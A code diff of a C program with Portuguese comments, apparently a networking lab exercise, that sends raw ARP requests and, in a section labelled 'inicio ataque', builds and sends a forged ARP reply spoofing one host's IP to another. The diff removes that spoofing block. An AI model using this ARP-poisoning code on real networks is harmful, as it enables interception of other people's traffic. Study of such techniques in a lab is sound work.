@@ -40,7 +40,7 @@ int main(int argc, char *argv[])
 	char hwsize = 0x06;
 	char protsize = 0x04;
 	short int op = htons(0x0001);
-	char sender_ip[] = {10, 0, 2, 20};
+	char sender_ip[] = {10, 0, 2, 21};
 	char target_eth[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 	char target_ip[] = {10, 0, 2, 1};
 	char target_ip2[] = {10, 0, 2, 21};
@@ -225,7 +225,7 @@ int j = 1;
 		memcpy(ip_dst, reply+24, sizeof(ip_dst));
 		
 		if ((ethertype2 == ETHERTYPE && oprecieve == 2)
-			&& (20 == ip_dst[3]))
+			&& (21 == ip_dst[3]))
 			//&& (orig_ip[0] == ip_dst[0] && orig_ip[1] == ip_dst[1] && orig_ip[2] == ip_dst[2] && orig_ip[3] == ip_dst[3])) 
 		{
 			printf("IP: %d.%d.%d.%d\t", ip_src[0], ip_src[1], ip_src[2], ip_src[3]);
@@ -241,7 +241,7 @@ int j = 1;
 		}
 		
 
-
+char sender_ip2[] = {10, 0, 2, 1};
 frame_len =0;
 
 
@@ -359,8 +359,8 @@ frame_len =0;
 	frame_len += MAC_ADDR_LEN;
 
 	/* ip origem */
-	memcpy(buffer + frame_len, &sender_ip, sizeof(sender_ip));
-	frame_len += sizeof(sender_ip);
+	memcpy(buffer + frame_len, &sender_ip2, sizeof(sender_ip2));
+	frame_len += sizeof(sender_ip2);
 
 	/* eth destino */
 	memcpy(buffer + frame_len, &dest_mac, sizeof(dest_mac));
@@ -424,7 +424,7 @@ frame_len =0;
 		memcpy(ip_dst2, reply2+24, sizeof(ip_dst2));
 		
 		if ((ethertype3 == ETHERTYPE && oprecieve2 == 2)
-			&& (20 == ip_dst2[3]))
+			&& (1 == ip_dst2[3]))
 			//&& (orig_ip[0] == ip_dst[0] && orig_ip[1] == ip_dst[1] && orig_ip[2] == ip_dst[2] && orig_ip[3] == ip_dst[3])) 
 		{
 			printf("linha 286 \n");
@@ -465,161 +465,7 @@ printf("\n");
 
 //inicio ataque
 
-//send
-	
-	char dest_mac_reply[] = {0x00, 0x00, 0x00, 0xaa, 0x00, 0x04}; //broadcast
-	short int op_reply = htons(0x0002);
-	char sender_ip_reply[] = {10, 0, 2, 21};
-	char target_eth_reply[] = {0x00, 0x00, 0x00, 0xaa, 0x00, 0x04};
-	char target_ip_reply[] = {10, 0, 2, 1};
 
-
-
-
-
-
-frame_len =0;
-
-
-	if (argc != 2) {
-		printf("Usage: %s iface\n", argv[0]);
-		return 1;
-	}
-	strcpy(ifname, argv[1]);
-
-	/* Cria um descritor de socket do tipo RAW */
-	fd = socket(PF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
-	if(fd < 0) {
-		perror("socket");
-		exit(1);
-	}
-
-	/* Obtem o indice da interface de rede */
-	strcpy(ifr.ifr_name, ifname);
-	if(ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
-		perror("ioctl");
-		exit(1);
-	}
-
-	/* Obtem as flags da interface */
-	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0){
-		perror("ioctl");
-		exit(1);
-	}
-
-	/* Coloca a interface em modo promiscuo */
-	ifr.ifr_flags |= IFF_PROMISC;
-	if(ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
-		perror("ioctl");
-		exit(1);
-	}
-
-
-
-
-
-
-	//send
-	/* Cria um descritor de socket do tipo RAW */
-	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
-		perror("socket");
-		exit(1);
-	}
-
-	/* Obtem o indice da interface de rede */
-	memset(&if_idx, 0, sizeof (struct ifreq));
-	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
-	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		exit(1);
-	}
-
-	/* Obtem o endereco MAC da interface local */
-	memset(&if_mac, 0, sizeof (struct ifreq));
-	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
-	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
-		perror("SIOCGIFHWADDR");
-		exit(1);
-	}
-
-	/* Indice da interface de rede */
-	socket_address.sll_ifindex = if_idx.ifr_ifindex;
-
-	/* Tamanho do endereco (ETH_ALEN = 6) */
-	socket_address.sll_halen = ETH_ALEN;
-
-	/* Endereco MAC de destino */
-	memcpy(socket_address.sll_addr, dest_mac_reply, MAC_ADDR_LEN);
-
-	/* Preenche o buffer com 0s */
-	memset(buffer, 0, BUFFER_SIZE);
-
-	/* Monta o cabecalho Ethernet */
-
-	/* Preenche o campo de endereco MAC de destino */	
-	memcpy(buffer, dest_mac_reply, MAC_ADDR_LEN);
-	frame_len += MAC_ADDR_LEN;
-
-	/* Preenche o campo de endereco MAC de origem */
-	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
-	frame_len += MAC_ADDR_LEN;
-
-	/* Preenche o campo EtherType */
-	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
-	frame_len += sizeof(ethertype);
-	
-	/* INICIO ARP */
-	
-	/* hwtype */
-	memcpy(buffer + frame_len, &hwtype, sizeof(hwtype));
-	frame_len += sizeof(hwtype);
-
-	/* prottype */
-	memcpy(buffer + frame_len, &prottype, sizeof(prottype));
-	frame_len += sizeof(prottype);
-
-	/* hwsize */
-	memcpy(buffer + frame_len, &hwsize, sizeof(hwsize));
-	frame_len += sizeof(hwsize);
-
-	/* protsize */
-	memcpy(buffer + frame_len, &protsize, sizeof(protsize));
-	frame_len += sizeof(protsize);
-
-	/* op */
-	memcpy(buffer + frame_len, &op_reply, sizeof(op_reply));
-	frame_len += sizeof(op_reply);
-
-	/* eth origem */
-	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
-	frame_len += MAC_ADDR_LEN;
-
-	/* ip origem */
-	memcpy(buffer + frame_len, &sender_ip_reply, sizeof(sender_ip_reply));
-	frame_len += sizeof(sender_ip_reply);
-
-	/* eth destino */
-	memcpy(buffer + frame_len, &dest_mac_reply, sizeof(dest_mac_reply));
-	frame_len += sizeof(dest_mac_reply);
-	
-	
-	//envia pacotes
-		//printf("IP: %d.%d.%d.%d\t  1 \n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
-		memcpy(buffer + frame_len, target_ip_reply, sizeof(target_ip_reply));
-		frame_len += sizeof(target_ip_reply);
-		//printf("IP: %d.%d.%d.%d\t  2 \n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
-		if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-		{
-			perror("send");
-			close(fd);
-			exit(1);
-		}
-
-		frame_len -= sizeof(target_ip_reply);
-	printf("Pacote enviado3.\n \n \n");
-	
-	
-	
 
 
 
